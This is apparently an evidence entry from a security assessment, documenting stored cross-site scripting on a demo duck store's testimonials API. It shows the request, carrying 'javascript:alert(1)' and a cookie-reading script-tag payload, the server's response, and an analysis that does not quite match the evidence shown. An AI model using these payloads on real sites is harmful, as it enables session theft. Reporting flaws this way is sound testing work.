## Evidence: xss-testimonials — Stored XSS in Testimonials

### Request
POST /api/v1/testimonials/ HTTP/1.1
Host: duck-store.escape.tech
Content-Type: application/json

{"name":"attacker","content":"Great ducks!","guest_avatar_url":"javascript:alert(1)","xss_payload":"<script>document.cookie</script>"}

### Response
HTTP/1.1 201 Created
Content-Type: application/json

{"id":42,"name":"attacker","content":"Great ducks!","guest_avatar_url":"javascript:alert(1)","testimonial":"created"}

### Analysis
The testimonial endpoint does not sanitize the guest_avatar_url field. Injecting a script tag via xss results in stored cross-site scripting when the testimonial is rendered.
